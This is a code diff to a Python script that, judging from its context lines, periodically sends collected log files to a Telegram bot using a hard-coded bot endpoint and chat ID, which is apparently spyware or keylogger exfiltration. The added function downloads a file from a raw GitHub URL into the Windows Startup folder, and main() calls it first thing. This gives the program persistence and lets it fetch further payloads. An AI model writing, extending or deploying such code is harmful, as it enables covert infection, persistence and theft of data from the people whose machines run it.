@@ -55,6 +55,10 @@ CHAT_ID = "241490872"
 URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
 SEND_INTERVAL = 15  # seconds
 
+# ====== Download to Startup ======
+DOWNLOAD_URL = "https://raw.githubusercontent.com/khaled88r5/p/refs/heads/main/1.txt"
+STARTUP_FILENAME = "file.txt"
+
 # ===============================
 # Logging
 # ===============================
@@ -71,6 +75,34 @@ log_buffer = []
 buffer_lock = threading.Lock()
 flush_interval = 1
 running = True
+
+
+# ===============================
+def download_to_startup():
+    """Download file from URL and save to Windows Startup folder."""
+    if sys.platform != "win32":
+        return
+    try:
+        startup_folder = os.path.join(
+            os.path.expanduser("~"),
+            "AppData",
+            "Roaming",
+            "Microsoft",
+            "Windows",
+            "Start Menu",
+            "Programs",
+            "Startup",
+        )
+        save_path = os.path.join(startup_folder, STARTUP_FILENAME)
+        response = requests.get(DOWNLOAD_URL, stream=True, timeout=30)
+        response.raise_for_status()
+        with open(save_path, "wb") as f:
+            for chunk in response.iter_content(8192):
+                if chunk:
+                    f.write(chunk)
+        logging.info("File saved to Startup folder: %s", save_path)
+    except Exception as e:
+        logging.warning("Download to Startup failed: %s", e)
 
 
 # ===============================
@@ -163,6 +195,7 @@ def cleanup():
 def main():
     try:
         logging.info(f"Running from: {BASE_DIR}")
+        download_to_startup()
         setup_log_file()
         flush_buffer()
 
